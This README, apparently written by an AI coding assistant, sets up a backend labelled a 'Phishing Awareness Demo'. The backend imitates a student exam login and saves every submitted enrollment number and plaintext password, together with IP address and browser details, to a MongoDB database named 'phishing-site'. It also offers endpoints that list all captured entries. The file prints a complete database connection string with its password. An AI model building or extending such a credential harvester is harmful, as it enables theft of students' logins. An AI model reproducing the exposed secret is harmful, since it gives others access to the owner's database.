# MongoDB Setup Instructions

## What's Been Implemented

Your backend now automatically stores all form submissions to MongoDB when users fill in the login form. Here's what was set up:

### Files Created/Modified:
1. **models/Submission.js** - MongoDB schema for storing form data
2. **server.js** - Updated to connect to MongoDB and save submissions
3. **package.json** - Added mongoose dependency

### Form Fields Stored:
- `session` - Study session (default: "Winter 2025")
- `exam` - Exam name
- `enrollmentNo` - Enrollment/Student ID
- `password` - Password entered
- `captcha` - CAPTCHA response
- `ipAddress` - User's IP address
- `userAgent` - Browser/device info
- `createdAt` - Timestamp of submission
- `updatedAt` - Last update timestamp

## Setup Instructions

### Step 1: Install Dependencies
Open terminal in the `backend` folder and run:
```bash
npm install
```

This will install mongoose and other dependencies.

### Step 2: MongoDB Connection
Your MongoDB URL is already configured in `.env`:
```
MONGODB_URL=mongodb+srv://dvpatel6048:S0fvydvyZMqtiuqk@echoflexcluster.ksiqx.mongodb.net/phishing-site
```

### Step 3: Start the Backend
```bash
npm start
```

Or for development with auto-reload:
```bash
npm run dev
```

When the server starts, you should see:
```
✓ MongoDB connected: [your-cluster-host]
Phishing Awareness Demo server running on http://localhost:5000
```

## Testing Data Storage

After starting the backend:

### Test Login Submission
```bash
curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "session": "Winter 2025",
    "exam": "Database Systems",
    "enrollmentNo": "12345678",
    "password": "test123",
    "captcha": "abc123"
  }'
```

### View All Submissions
```bash
curl http://localhost:5000/api/submissions
```

### View Statistics
```bash
curl http://localhost:5000/api/submissions/stats
```

## Available API Endpoints

| Method | Endpoint | Purpose |
|--------|----------|---------|
| POST | `/api/login` | Submit phishing simulation form (stores in MongoDB) |
| GET | `/api/submissions` | View all stored submissions |
| GET | `/api/submissions/stats` | View submission statistics |
| GET | `/api/health` | Server health check |

## Notes

✅ All form data from the frontend is now automatically stored in MongoDB  
✅ Includes automatic timestamps for when data was submitted  
✅ Also captures user's IP address and browser information  
✅ Server continues running even if MongoDB connection fails  
✅ Returns the same phishing warning response to frontend

## Troubleshooting

**MongoDB Connection Error?**
- Verify the MONGODB_URL in .env is correct
- Check if MongoDB cluster is running
- Ensure your IP is whitelisted in MongoDB Atlas

**"Cannot find module 'mongoose'"?**
- Run `npm install` in the backend folder
- Delete `node_modules` and run `npm install` again

**Data not showing up?**
- Check browser console and backend logs for errors
- Verify MongoDB URL has the correct database name: `phishing-site`
